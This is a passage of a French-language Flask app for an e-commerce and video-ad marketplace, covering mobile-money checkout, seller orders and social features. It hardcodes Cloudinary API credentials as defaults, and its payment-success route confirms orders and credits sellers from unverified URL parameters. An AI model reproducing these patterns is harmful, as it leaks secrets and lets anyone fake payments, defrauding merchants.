            {"id": 35, "name": "MOMO BJ", "description": "MTN MONEY BENIN"},
            {"id": 36, "name": "MOOV BJ", "description": "MOOV BENIN"},
        ],
        "TG": [
            {"id": 37, "name": "T-MONEY TG", "description": "T-MONEY TOGO"},
            {"id": 38, "name": "MOOV TG", "description": "MOOV TOGO"},
        ],
        "COD": [
            {"id": 52, "name": "VODACOM COD", "description": "VODACOM CONGO DRC"},
            {"id": 53, "name": "AIRTEL COD", "description": "AIRTEL CONGO DRC"},
            {"id": 54, "name": "ORANGE COD", "description": "ORANGE CONGO DRC"},
        ],
        "COG": [
            {"id": 55, "name": "AIRTEL COG", "description": "AIRTEL CONGO"},
            {"id": 56, "name": "MOMO COG", "description": "MTN MOMO CONGO"},
        ],
        "GAB": [
            {"id": 57, "name": "AIRTEL GAB", "description": "AIRTEL GABON"},
        ],
        "UGA": [
            {"id": 58, "name": "AIRTEL UGA", "description": "AIRTEL UGANDA"},
            {"id": 59, "name": "MOMO UGA", "description": "MTN MOMO UGANDA"},
        ],
    }
    
    return render_template("checkout.html", 
        user=user, 
        panier=panier, 
        total=total, 
        frais_livraison=frais_livraison,
        grand_total=grand_total,
        countries=countries,
        countries_json=countries,
        services_json=services)


def initier_paiement_soleaspay(commande, telephone, montant, email, nom, payment_method_str):
    """Initie le paiement via SoleasPay"""
    # Mapping des services de paiement
    service_map = {
        "momo": 1,  # MTN Mobile Money
        "om": 2,    # Orange Money
        "wave": 32, # Wave
        "momo_ci": 30,  # MTN CI
        "om_ci": 29,    # Orange CI
    }
    
    service_id = service_map.get(payment_method_str, 1)
    
    # Payload pour SoleasPay
    payload = {
        "wallet": telephone,
        "amount": montant,
        "currency": "XOF",
        "order_id": f"NOVA-{commande.id}",
        "description": f"Paiement commande {commande.reference}",
        "payer": nom,
        "payerEmail": email,
        "successUrl": url_for("paiement_succes", _external=True),
        "failureUrl": url_for("paiement_echec", _external=True),
    }
    
    headers = {
        "x-api-key": SOLEAS_API_KEY,
        "operation": "2",
        "service": str(service_id),
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(
            "https://soleaspay.com/api/agent/bills/v3",
            headers=headers,
            json=payload,
            timeout=30
        )
        result = response.json()
        
        if result.get("succès") or result.get("success"):
            # Rediriger vers la page de confirmation SoleasPay
            payment_url = result.get("payment_url") or result.get("redirect_url")
            if payment_url:
                return redirect(payment_url)
            else:
                flash("Veuillez confirmer le paiement sur votre téléphone.", "info")
                return redirect(url_for("paiement_en_attente", commande_id=commande.id))
        else:
            flash(f"Erreur de paiement : {result.get('message', 'Erreur inconnue')}", "danger")
            return redirect(url_for("checkout_page"))
    except Exception as e:
        flash(f"Erreur de connexion au serveur de paiement : {e}", "danger")
        return redirect(url_for("checkout_page"))


@app.route("/paiement/succes")
def paiement_succes():
    """Page de succès après paiement"""
    order_id = request.args.get("orderId")
    pay_id = request.args.get("payId")
    
    if not order_id or not pay_id:
        flash("Paramètres de paiement invalides.", "danger")
        return redirect(url_for("index_page"))
    
    # Extraire l'ID de la commande
    try:
        commande_id = int(order_id.replace("NOVA-", ""))
    except:
        flash("Commande introuvable.", "danger")
        return redirect(url_for("index_page"))
    
    commande = Commande.query.get(commande_id)
    if not commande:
        flash("Commande introuvable.", "danger")
        return redirect(url_for("index_page"))
    
    # Mettre à jour le statut
    commande.statut = "confirmee"
    db.session.commit()
    
    # Traiter la commande (créditer le vendeur, etc.)
    traiter_commande_apres_paiement(commande)
    
    # Vider le panier
    ArticlePanier.query.filter_by(panier_id=commande.user.paniers.first().id if commande.user else None).delete()
    db.session.commit()
    
    flash(f"Paiement réussi ! Référence : {commande.reference}", "success")
    return render_template("paiement_succes.html", commande=commande)


@app.route("/paiement/echec")
def paiement_echec():
    """Page d'échec de paiement"""
    flash("Le paiement a échoué. Veuillez réessayer.", "danger")
    return redirect(url_for("checkout_page"))


@app.route("/paiement/attente/<int:commande_id>")
def paiement_en_attente(commande_id):
    """Page d'attente de confirmation"""
    commande = Commande.query.get_or_404(commande_id)
    return render_template("paiement_en_attente.html", commande=commande)


def traiter_commande_apres_paiement(commande):
    """Traite une commande après paiement confirmé"""
    # 1. Créditer le vendeur
    boutique = commande.boutique
    vendeur = boutique.proprietaire
    
    # Montant de la commande (moins les frais de livraison)
    montant_vente = commande.total - commande.frais_livraison
    
    # Créditer le solde du vendeur
    vendeur.solde_revenu = (vendeur.solde_revenu or 0) + montant_vente
    vendeur.solde_parrainage = (vendeur.solde_parrainage or 0) + montant_vente
    
    # 2. Mettre à jour les statistiques de ventes
    for article in commande.articles:
        produit = article.produit
        produit.ventes = (produit.ventes or 0) + article.quantite
        produit.quantite = max(0, (produit.quantite or 1) - article.quantite)
    
    # 3. Envoyer notification email au vendeur
    envoyer_email_notification_vente(vendeur, commande)
    
    # 4. Si l'acheteur a un parrain, calculer la commission
    if commande.user and commande.user.parrain:
        parrain = User.query.filter_by(username=commande.user.parrain).first()
        if parrain:
            commission = montant_vente * 0.05  # 5% de commission
            parrain.solde_revenu = (parrain.solde_revenu or 0) + commission
            parrain.solde_parrainage = (parrain.solde_parrainage or 0) + commission
    
    db.session.commit()


def envoyer_email_notification_vente(vendeur, commande):
    """Envoie un email au vendeur pour une nouvelle vente"""
    if not vendeur.email:
        return
    
    try:
        # Récupérer les détails de la commande
        articles_details = []
        for article in commande.articles:
            articles_details.append(f"{article.produit.nom} x{article.quantite} - {article.prix_unitaire * article.quantite} XOF")
        
        html_content = f"""
        <h2>🎉 Nouvelle Vente !</h2>
        <p>Vous avez reçu une nouvelle commande sur votre boutique <strong>{commande.boutique.nom}</strong>.</p>
        
        <h3>Détails de la commande :</h3>
        <ul>
            <li><strong>Référence :</strong> {commande.reference}</li>
            <li><strong>Montant :</strong> {commande.total} XOF</li>
            <li><strong>Client :</strong> {commande.notes.split('Nom:')[1].split(',')[0] if 'Nom:' in (commande.notes or '') else 'N/A'}</li>
            <li><strong>Email :</strong> {commande.notes.split('Email:')[1].split(',')[0] if 'Email:' in (commande.notes or '') else 'N/A'}</li>
            <li><strong>Téléphone :</strong> {commande.telephone_livraison}</li>
            <li><strong>Adresse :</strong> {commande.adresse_livraison}</li>
        </ul>
        
        <h3>Articles commandés :</h3>
        <ul>
            {''.join([f'<li>{detail}</li>' for detail in articles_details])}
        </ul>
        
        <p>Votre solde a été crédité de <strong>{commande.total - commande.frais_livraison} XOF</strong>.</p>
        
        <a href="{url_for('ma_boutique', boutique_id=commande.boutique.id, _external=True)}" style="display: inline-block; padding: 10px 20px; background: #3498db; color: white; text-decoration: none; border-radius: 5px;">Voir ma boutique</a>
        """
        
        # Envoyer l'email via Resend ou Flask-Mail
        if API_KEY:
            requests.post(
                "https://api.resend.com/emails",
                headers={
                    "Authorization": f"Bearer {API_KEY}",
                    "Content-Type": "application/json"
                },
                json={
                    "from": "NovaTrade <no-reply@nova-trade.cc>",
                    "to": [vendeur.email],
                    "subject": f"🎉 Nouvelle vente - Commande {commande.reference}",
                    "html": html_content
                }
            )
    except Exception as e:
        print(f"Erreur envoi email notification: {e}")

@app.route("/boutique/<int:boutique_id>/supprimer")
@login_required
def supprimer_boutique(boutique_id):
    """Supprimer une boutique (désactivation logique)"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))

    # Désactiver la boutique (soft delete)
    boutique.est_actif = False
    db.session.commit()

    flash("Boutique supprimée avec succès.", "success")
    return redirect(url_for("dashboard_page"))


@app.route("/boutiques")
def liste_boutiques():
    """Page publique pour voir toutes les boutiques"""
    user = get_logged_in_user()
    boutiques = Boutique.query.filter_by(est_actif=True).order_by(Boutique.date_creation.desc()).limit(50).all()

    return render_template("shop_public.html", boutiques=boutiques, user=user)


@app.route("/market")
def market_page():
    """Page Market - Toutes les boutiques et produits récents"""
    user = get_logged_in_user()
    categorie_id = request.args.get("categorie", type=int)
    
    # Récupérer toutes les boutiques actives
    boutiques = Boutique.query.filter_by(est_actif=True).order_by(Boutique.date_creation.desc()).limit(12).all()
    
    # Récupérer les produits récents (du plus récent au plus ancien)
    query = Produit.query.filter_by(est_actif=True)
    
    if categorie_id:
        query = query.filter_by(categorie_id=categorie_id)
    
    produits = query.order_by(Produit.date_creation.desc()).limit(24).all()
    
    # Récupérer toutes les catégories pour les filtres
    categories = Categorie.query.order_by(Categorie.nom).all()
    
    return render_template("market.html",
        boutiques=boutiques,
        produits=produits,
        categories=categories,
        categorie_actuelle=categorie_id,
        user=user
    )


# ==============================
# 📦 GESTION DES COMMANDES POUR VENDEURS
# ==============================

@app.route("/boutique/<int:boutique_id>/commandes")
@login_required
def boutique_commandes(boutique_id):
    """Page 'Mes commandes' - Voir les commandes en attente pour une boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()
    
    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))
    
    # Récupérer les commandes en attente
    commandes = Commande.query.filter_by(boutique_id=boutique.id, statut="en_attente").order_by(Commande.date_creation.desc()).all()
    
    return render_template("boutique_commandes.html",
        boutique=boutique,
        commandes=commandes,
        user=user
    )


@app.route("/boutique/<int:boutique_id>/ventes")
@login_required
def boutique_ventes(boutique_id):
    """Page 'Mes ventes' - Voir les commandes confirmées pour une boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()
    
    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))
    
    # Récupérer les commandes confirmées
    commandes = Commande.query.filter_by(boutique_id=boutique.id, statut="confirmee").order_by(Commande.date_creation.desc()).all()
    
    return render_template("boutique_ventes.html",
        boutique=boutique,
        commandes=commandes,
        user=user
    )


# Routes alternatives sans boutique_id (pour accès direct depuis le dashboard)
@app.route("/boutique/commandes")
@login_required
def voir_commandes_boutique():
    """Page 'Mes commandes' - Voir toutes les commandes en attente de l'utilisateur"""
    user = get_logged_in_user()
    
    # Récupérer toutes les boutiques de l'utilisateur
    boutiques = Boutique.query.filter_by(user_id=user.id, est_actif=True).all()
    boutique_ids = [b.id for b in boutiques]
    
    if not boutique_ids:
        flash("Vous n'avez pas de boutique active.", "warning")
        return redirect(url_for("dashboard_page"))
    
    # Récupérer les commandes en attente de toutes les boutiques
    commandes = Commande.query.filter(
        Commande.boutique_id.in_(boutique_ids),
        Commande.statut == "en_attente"
    ).order_by(Commande.date_creation.desc()).all()
    
    return render_template("boutique_commandes.html",
        boutique=boutiques[0] if len(boutiques) == 1 else None,
        commandes=commandes,
        user=user
    )


@app.route("/boutique/ventes")
@login_required
def voir_ventes_boutique():
    """Page 'Mes ventes' - Voir toutes les ventes confirmées de l'utilisateur"""
    user = get_logged_in_user()
    
    # Récupérer toutes les boutiques de l'utilisateur
    boutiques = Boutique.query.filter_by(user_id=user.id, est_actif=True).all()
    boutique_ids = [b.id for b in boutiques]
    
    if not boutique_ids:
        flash("Vous n'avez pas de boutique active.", "warning")
        return redirect(url_for("dashboard_page"))
    
    # Récupérer les commandes confirmées de toutes les boutiques
    commandes = Commande.query.filter(
        Commande.boutique_id.in_(boutique_ids),
        Commande.statut == "confirmee"
    ).order_by(Commande.date_creation.desc()).all()
    
    return render_template("boutique_ventes.html",
        boutique=boutiques[0] if len(boutiques) == 1 else None,
        commandes=commandes,
        user=user
    )


@app.route("/commande/<int:commande_id>/confirmer")
@login_required
def confirmer_commande(commande_id):
    """Confirmer une commande (vendeur)"""
    commande = Commande.query.get_or_404(commande_id)
    boutique = commande.boutique
    user = get_logged_in_user()
    
    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))
    
    if commande.statut != "en_attente":
        flash("Cette commande a déjà été traitée.", "warning")
        return redirect(url_for("boutique_ventes", boutique_id=boutique.id))
    
    # Confirmer la commande
    commande.statut = "confirmee"
    commande.date_modification = datetime.utcnow()
    
    # Créditer le vendeur
    montant_vente = commande.total - commande.frais_livraison
    vendeur = boutique.proprietaire
    vendeur.solde_revenu = (vendeur.solde_revenu or 0) + montant_vente
    
    # Mettre à jour les statistiques de ventes
    for article in commande.articles:
        produit = article.produit
        produit.ventes = (produit.ventes or 0) + article.quantite
        produit.quantite = max(0, (produit.quantite or 1) - article.quantite)
    
    db.session.commit()
    
    flash(f"Commande #{commande.reference} confirmée avec succès !", "success")
    return redirect(url_for("boutique_ventes", boutique_id=boutique.id))


@app.route("/commande/<int:commande_id>/rejeter")
@login_required
def rejeter_commande(commande_id):
    """Rejeter une commande (vendeur)"""
    commande = Commande.query.get_or_404(commande_id)
    boutique = commande.boutique
    user = get_logged_in_user()
    
    # Vérifier que l'utilisateur est le propriétaire
    if boutique.user_id != user.id:
        flash("Accès refusé.", "danger")
        return redirect(url_for("dashboard_page"))
    
    if commande.statut != "en_attente":
        flash("Cette commande a déjà été traitée.", "warning")
        return redirect(url_for("boutique_commandes", boutique_id=boutique.id))
    
    # Rejeter la commande
    commande.statut = "annulee"
    commande.date_modification = datetime.utcnow()
    
    # Remettre les produits en stock
    for article in commande.articles:
        produit = article.produit
        produit.quantite = (produit.quantite or 0) + article.quantite
    
    db.session.commit()
    
    flash(f"Commande #{commande.reference} rejetée.", "info")
    return redirect(url_for("boutique_commandes", boutique_id=boutique.id))


# ==============================
# 📹 ROUTES POUR LES PUBLICITÉS VIDEO (Style TikTok)
# ==============================

# Configuration Cloudinary pour stockage vidéos
import cloudinary
import cloudinary.uploader
from cloudinary.exceptions import Error as CloudinaryError

# Configuration Cloudinary via variables d'environnement
CLOUDINARY_CLOUD_NAME = os.getenv('CLOUDINARY_CLOUD_NAME', 'dzxlwxjzx')
CLOUDINARY_API_KEY = os.getenv('CLOUDINARY_API_KEY', '277798215838877')
CLOUDINARY_API_SECRET = os.getenv('CLOUDINARY_API_SECRET', 'm0SAaqzlpih4hLX50x14z7AV4Oc')

# Initialiser Cloudinary
cloudinary.config(
    cloud_name=CLOUDINARY_CLOUD_NAME,
    api_key=CLOUDINARY_API_KEY,
    api_secret=CLOUDINARY_API_SECRET
)

ALLOWED_VIDEO_EXTENSIONS = {'mp4', 'webm', 'mov', 'avi'}
MAX_VIDEO_SIZE = 100 * 1024 * 1024  # 100MB pour Cloudinary

def allowed_video(filename):
    """Vérifie si l'extension du fichier vidéo est autorisée"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_VIDEO_EXTENSIONS


@app.route("/publicites")
def publicites_page():
    """Page principale des publicités (style TikTok)"""
    user = get_logged_in_user()
    
    # Récupérer les publicités actives, triées par date
    publicites = Publicite.query.filter_by(est_actif=True).order_by(Publicite.date_creation.desc()).limit(20).all()
    
    # Récupérer les IDs des utilisateurs que l'utilisateur courant suit
    following_ids = []
    if user:
        following_ids = [f.following_id for f in user.following.all()]
    
    return render_template("publicite.html", 
        publicites=publicites, 
        user=user,
        following_ids=following_ids)


@app.route("/publicite/creer", methods=["GET", "POST"])
@login_required
def creer_publicite():
    """Page pour créer une publicité vidéo - Réservé aux vendeurs"""
    user = get_logged_in_user()
    
    # Vérifier si l'utilisateur a une boutique active
    boutiques = Boutique.query.filter_by(user_id=user.id, est_actif=True).all()
    
    if not boutiques:
        # L'utilisateur n'a pas de boutique, redirection vers la page de création de boutique
        flash("Vous devez avoir une boutique pour créer une publicité.", "warning")
        return redirect(url_for("creer_boutique"))
    
    # Récupérer les produits de l'utilisateur
    produits = []
    for boutique in boutiques:
        produits.extend(Produit.query.filter_by(boutique_id=boutique.id, est_actif=True).all())
    
    return render_template("publicite_creer.html", 
        user=user, 
        produits=produits,
        boutiques=boutiques)


@app.route("/api/publicite/creer", methods=["POST"])
@api_login_required
def api_creer_publicite():
    """API pour créer une publicité vidéo - Upload vers Cloudinary"""
    user = get_logged_in_user()
    
    # Vérifier les fichiers
    if 'video' not in request.files:
        return jsonify({"success": False, "message": "Aucune vidéo fournie"}), 400
    
    video_file = request.files['video']
    
    if not video_file.filename:
        return jsonify({"success": False, "message": "Nom de fichier vide"}), 400
    
    if not allowed_video(video_file.filename):
        return jsonify({"success": False, "message": "Format vidéo non supporté. Utilisez MP4, WebM, MOV ou AVI."}), 400
    
    # Vérifier la taille
    video_file.seek(0, os.SEEK_END)
    size = video_file.tell()
    video_file.seek(0)
    
    if size > MAX_VIDEO_SIZE:
        return jsonify({"success": False, "message": "Vidéo trop volumineuse (max 100MB)"}), 400
    
    # Récupérer les données du formulaire
    titre = request.form.get('titre', '').strip()
    description = request.form.get('description', '').strip()
    prix = request.form.get('prix', type=float)
    devise = request.form.get('devise', 'XOF')
    produit_id = request.form.get('produit_id', type=int)
    
    if not titre:
        return jsonify({"success": False, "message": "Le titre est obligatoire"}), 400
    
    if not prix or prix < 0:
        return jsonify({"success": False, "message": "Le prix est obligatoire"}), 400
    
    # Trouver la boutique et le produit
    boutique = None
    produit = None
    
    if produit_id:
        produit = Produit.query.get(produit_id)
        if produit:
            boutique = produit.boutique
    
    # Si pas de produit, prendre la première boutique de l'utilisateur
    if not boutique:
        boutique = Boutique.query.filter_by(user_id=user.id, est_actif=True).first()
    
    if not boutique:
        return jsonify({"success": False, "message": "Vous devez avoir une boutique pour créer une publicité"}), 400
    
    # Upload vers Cloudinary
    try:
        # Reset file pointer for Cloudinary upload
        video_file.seek(0)
        
        # Upload vers Cloudinary
        upload_result = cloudinary.uploader.upload(
            video_file,
            resource_type="video",
            folder="publicites",
            public_id=f"pub_{uuid.uuid4().hex[:8]}",
            context={
                "titre": titre,
                "prix": str(prix),
                "devise": devise
            }
        )
        
        video_url = upload_result.get("secure_url")
        
        if not video_url:
            return jsonify({"success": False, "message": "Erreur lors de l'upload vidéo"}), 500
        
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Erreur upload vidéo: {str(e)}"
        }), 500
    
    # Créer la publicité
    nouvelle_publicite = Publicite(
        boutique_id=boutique.id,
        user_id=user.id,
        produit_id=produit_id if produit else None,
        video_url=video_url,  # URL Cloudinary
        titre=titre,
        description=description if description else None,
        prix=prix,
        devise=devise,
        est_actif=True
    )
    
    db.session.add(nouvelle_publicite)
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Publicité publiée avec succès",
        "publicite_id": nouvelle_publicite.id,
        "video_url": video_url
    })


@app.route("/api/publicite/<int:pub_id>/like", methods=["POST"])
@api_login_required
def api_like_publicite(pub_id):
    """API pour liker/retirer un like d'une publicité"""
    user = get_logged_in_user()
    publicite = Publicite.query.get_or_404(pub_id)
    
    # Vérifier si déjà liké
    existing_like = LikePublicite.query.filter_by(
        publicite_id=pub_id,
        user_id=user.id
    ).first()
    
    if existing_like:
        # Retirer le like
        db.session.delete(existing_like)
        publicite.likes = max(0, publicite.likes - 1)
        liked = False
    else:
        # Ajouter le like
        new_like = LikePublicite(publicite_id=pub_id, user_id=user.id)
        db.session.add(new_like)
        publicite.likes += 1
        liked = True
    
    db.session.commit()
    
    return jsonify({
        "success": True,
        "liked": liked,
        "likes": publicite.likes
    })


@app.route("/api/publicite/<int:pub_id>/commentaires", methods=["GET"])
def api_commentaires_publicite(pub_id):
    """API pour récupérer les commentaires d'une publicité"""
    publicite = Publicite.query.get_or_404(pub_id)
    
    commentaires = CommentairePublicite.query.filter_by(publicite_id=pub_id).order_by(CommentairePublicite.date_creation.desc()).limit(50).all()
    
    result = []
    for c in commentaires:
        result.append({
            "id": c.id,
            "user": c.user.username,
            "texte": c.texte,
            "date": c.date_creation.strftime("%d/%m/%Y %H:%M") if c.date_creation else ""
        })
    
    return jsonify(result)


@app.route("/api/publicite/<int:pub_id>/commentaire", methods=["POST"])
@api_login_required
def api_ajouter_commentaire(pub_id):
    """API pour ajouter un commentaire à une publicité"""
    user = get_logged_in_user()
    publicite = Publicite.query.get_or_404(pub_id)
    
    data = request.get_json()
    texte = data.get('texte', '').strip()
    
    if not texte:
        return jsonify({"success": False, "message": "Commentaire vide"}), 400
    
    nouveau_commentaire = CommentairePublicite(
        publicite_id=pub_id,
        user_id=user.id,
        texte=texte
    )
    
    db.session.add(nouveau_commentaire)
    publicite.commentaires_count = (publicite.commentaires_count or 0) + 1
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Commentaire ajouté"
    })


@app.route("/api/publicite/<int:pub_id>/share", methods=["POST"])
def api_share_publicite(pub_id):
    """API pour incrémenter le compteur de partages"""
    publicite = Publicite.query.get_or_404(pub_id)
    publicite.partages = (publicite.partages or 0) + 1
    db.session.commit()
    
    return jsonify({"success": True, "partages": publicite.partages})


@app.route("/api/publicite/<int:pub_id>/vue", methods=["POST"])
def api_vue_publicite(pub_id):
    """API pour incrémenter le compteur de vues (une seule vue par utilisateur)"""
    publicite = Publicite.query.get_or_404(pub_id)
    user = get_logged_in_user()
    
    # Pour les utilisateurs connectés, vérifier s'ils ont déjà vu
    if user:
        # On utilise une table de suivi des vues (à créer) ou on vérifie si la vue a déjà été comptée
        # Pour simplifier, on utilise le fait que l'utilisateur ne peut voter qu'une fois
        # On pourrait créer une table VuePublicite pour tracker les vues uniques
        pass
    
    # Incrémenter seulement si c'est une nouvelle vue
    # Note: Pour une solution parfaite, il faudrait créer une table VuePublicite
    # Pour l'instant, on se base sur le fait que le frontend n'envoie qu'une seule fois
    publicite.vues = (publicite.vues or 0) + 1
    db.session.commit()
    
    return jsonify({"success": True, "vues": publicite.vues})


# ==============================
# 👥 ROUTES POUR LES FOLLOWERS/ABONNEMENTS
# ==============================

@app.route("/api/user/<int:user_id>/follow", methods=["POST"])
@api_login_required
def api_follow_user(user_id):
    """API pour suivre/unfollow un utilisateur"""
    user = get_logged_in_user()
    target_user = User.query.get_or_404(user_id)
    
    if user.id == target_user.id:
        return jsonify({"success": False, "message": "Impossible de se suivre soi-même"}), 400
    
    # Vérifier si déjà following
    existing_follow = Follow.query.filter_by(
        follower_id=user.id,
        following_id=target_user.id
    ).first()
    
    if existing_follow:
        db.session.delete(existing_follow)
        followed = False
    else:
        new_follow = Follow(follower_id=user.id, following_id=target_user.id)
        db.session.add(new_follow)
        followed = True
    
    db.session.commit()
    
    return jsonify({
        "success": True,
        "followed": followed,
        "followers_count": target_user.followers.count()
    })


@app.route("/user/<username>/followers")
def user_followers(username):
    """Page pour voir les followers d'un utilisateur"""
    user = User.query.filter_by(username=username).first_or_404()
    followers = user.followers.all()
    return render_template("user_followers.html", 
        target_user=user, 
        followers=followers,
        user=get_logged_in_user())


@app.route("/user/<username>/following")
def user_following(username):
    """Page pour voir les abonnements d'un utilisateur"""
    user = User.query.filter_by(username=username).first_or_404()
    following = user.following.all()
    return render_template("user_following.html", 
        target_user=user, 
        following=following,
        user=get_logged_in_user())


# ==============================
# 📹 ROUTES POUR PROFIL PUBLICITÉS (Style TikTok)
# ==============================

@app.route("/publicite/activite")
@login_required
def publicite_activite():
    """Page Activités - Voir les likes et commentaires reçus sur ses publicités"""
    user = get_logged_in_user()
    
    # Récupérer les publicités de l'utilisateur
    publicites_user = Publicite.query.filter_by(user_id=user.id).all()
    publicite_ids = [p.id for p in publicites_user]
    
    # Récupérer les likes reçus (autres utilisateurs qui ont liké)
    likes_recus = []
    if publicite_ids:
        likes = LikePublicite.query.filter(LikePublicite.publicite_id.in_(publicite_ids)).order_by(LikePublicite.date_creation.desc()).limit(50).all()
        for like in likes:
            pub = Publicite.query.get(like.publicite_id)
            likes_recus.append({
                'user': like.user.username,
                'publicite': pub.titre if pub else 'Publicité supprimée',
                'date': like.date_creation.strftime('%d/%m/%Y %H:%M') if like.date_creation else ''
            })
    
    # Récupérer les commentaires reçus
    commentaires_recus = []
    if publicite_ids:
        commentaires = CommentairePublicite.query.filter(CommentairePublicite.publicite_id.in_(publicite_ids)).order_by(CommentairePublicite.date_creation.desc()).limit(50).all()
        for com in commentaires:
            commentaires_recus.append({
                'user': com.user.username,
                'texte': com.texte,
                'publicite': com.publicite.titre,
                'date': com.date_creation.strftime('%d/%m/%Y %H:%M') if com.date_creation else ''
            })
    
    # Total likes et commentaires
    total_likes = sum(p.likes or 0 for p in publicites_user)
    total_commentaires = sum(p.commentaires_count or 0 for p in publicites_user)
    
    return render_template("publicite_activite.html",
        user=user,
        likes_recus=likes_recus,
        commentaires_recus=commentaires_recus,
        total_likes=total_likes,
        total_commentaires=total_commentaires
    )


@app.route("/publicite/profil")
@login_required
def publicite_profil():
    """Page Profil - Voir ses publicités publiées et statistiques"""
    user = get_logged_in_user()
    
    # Récupérer les publicités de l'utilisateur
    publicites = Publicite.query.filter_by(user_id=user.id).order_by(Publicite.date_creation.desc()).all()
    
    # Statistiques
    total_vues = sum(p.vues or 0 for p in publicites)
    total_likes = sum(p.likes or 0 for p in publicites)
    total_commentaires = sum(p.commentaires_count or 0 for p in publicites)
    total_publicites = len(publicites)
    
    # Nombre d'abonnés (followers)
    followers_count = user.followers.count()
    following_count = user.following.count()
    
    return render_template("publicite_profil.html",
        user=user,
        publicites=publicites,
        total_vues=total_vues,
        total_likes=total_likes,
        total_commentaires=total_commentaires,
        total_publicites=total_publicites,
        followers_count=followers_count,
        following_count=following_count
    )


@app.route("/publicite/<int:pub_id>")
def detail_publicite(pub_id):
    """Page détail d'une publicité vidéo"""
    publicite = Publicite.query.get_or_404(pub_id)
    user = get_logged_in_user()
    is_owner = user and publicite.user_id == user.id
    
    # Incrémenter les vues
    publicite.vues = (publicite.vues or 0) + 1
    db.session.commit()
    
    # Récupérer les commentaires
    commentaires = CommentairePublicite.query.filter_by(publicite_id=pub_id).order_by(CommentairePublicite.date_creation.desc()).limit(50).all()
    
    # Vérifier si l'utilisateur a déjà liké
    has_liked = False
    if user:
        has_liked = LikePublicite.query.filter_by(publicite_id=pub_id, user_id=user.id).first() is not None
    
    return render_template("publicite_detail.html",
        publicite=publicite,
        user=user,
        is_owner=is_owner,
        commentaires=commentaires,
        has_liked=has_liked
    )


@app.route("/api/publicite/<int:pub_id>/supprimer", methods=["POST"])
@api_login_required
def api_supprimer_publicite(pub_id):
    """API pour supprimer une publicité (propriétaire uniquement)"""
    publicite = Publicite.query.get_or_404(pub_id)
    user = get_logged_in_user()
    
    # Vérifier que l'utilisateur est le propriétaire
    if publicite.user_id != user.id:
        return jsonify({"success": False, "message": "Accès refusé"}), 403
    
    # Supprimer le fichier vidéo si possible
    if publicite.video_url:
        try:
            video_path = os.path.join(app.root_path, 'static', publicite.video_url.lstrip('/'))
            if os.path.exists(video_path):
                os.remove(video_path)
        except Exception as e:
            print(f"Erreur suppression fichier vidéo: {e}")
    
    # Supprimer la publicité (les commentaires et likes associés seront supprimés en cascade)
    db.session.delete(publicite)
    db.session.commit()
    
    return jsonify({"success": True, "message": "Publicité supprimée"})


# ─── ROUTES API POUR PUBLICITÉS (SAUVEGARDER, SIGNALER, etc.) ──────────────

@app.route("/api/publicite/<int:pub_id>/sauvegarder", methods=["POST"])
@api_login_required
def api_sauvegarder_publicite(pub_id):
    """API pour sauvegarder/retirer une publicité"""
    user = get_logged_in_user()
    
    # Vérifier si déjà sauvegardé
    existing = SauvegardePublicite.query.filter_by(
        publicite_id=pub_id, user_id=user.id
    ).first()
    
    if existing:
        # Retirer la sauvegarde
        db.session.delete(existing)
        db.session.commit()
        return jsonify({"success": True, "saved": False, "message": "Retiré des sauvegardes"})
    else:
        # Ajouter la sauvegarde
        sauvegarde = SauvegardePublicite(publicite_id=pub_id, user_id=user.id)
        db.session.add(sauvegarde)
        db.session.commit()
        return jsonify({"success": True, "saved": True, "message": "Publicité sauvegardée"})


@app.route("/api/publicite/<int:pub_id>/signaler", methods=["POST"])
@api_login_required
def api_signaler_publicite(pub_id):
    """API pour signaler une publicité inappropriée"""
    user = get_logged_in_user()
    data = request.get_json()
    
    if not data:
        return jsonify({"success": False, "message": "Données invalides"}), 400
    
    raison = data.get('raison', 'other')
    description = data.get('description', '')
    
    # Vérifier si déjà signalé
    existing = SignalementPublicite.query.filter_by(
        publicite_id=pub_id, user_id=user.id
    ).first()
    
    if existing:
        return jsonify({"success": False, "message": "Déjà signalé"}), 400
    
    # Créer le signalement
    signalement = SignalementPublicite(
        publicite_id=pub_id,
        user_id=user.id,
        raison=raison,
        description=description
    )
    db.session.add(signalement)
    db.session.commit()
    
    return jsonify({"success": True, "message": "Publicité signalée. Merci!"})


@app.route("/api/publicite/<int:pub_id>/vue", methods=["POST"])
@api_login_required
def api_publicite_vue(pub_id):
    """API pour compter une vue unique par utilisateur"""
    user = get_logged_in_user()
    publicite = Publicite.query.get_or_404(pub_id)
    
    # Vérifier si déjà vu (via table de suivi ou session)
    # Pour simplifier, on utilise une clé de session
    if 'vues_publicites' not in session:
        session['vues_publicites'] = []
    
    vues = session['vues_publicites']
    
    if pub_id not in vues:
        vues.append(pub_id)
        session.modified = True
        publicite.vues = (publicite.vues or 0) + 1
        db.session.commit()
        return jsonify({"success": True, "vues": publicite.vues})
    
    return jsonify({"success": True, "vues": publicite.vues, "already_counted": True})


@app.route("/api/publicite/<int:pub_id>/share", methods=["POST"])
@api_login_required
def api_publicite_share(pub_id):
    """API pour compter un partage"""
    publicite = Publicite.query.get_or_404(pub_id)
    publicite.partages = (publicite.partages or 0) + 1
    db.session.commit()
    return jsonify({"success": True, "partages": publicite.partages})


# Initialiser les catégories au démarrage
with app.app_context():
    try:
        init_categories()
    except:
        pass  # Ignore les erreurs si la table n'existe pas encore


# DEBUG: Vérification du dossier static au démarrage
print("=" * 60)
print("DEBUG STARTUP - VERIFICATION DOSSIER STATIC")
print("=" * 60)
print("APP_ROOT =", app.root_path)
static_path = os.path.join(app.root_path, "static")
print("static_path =", static_path)
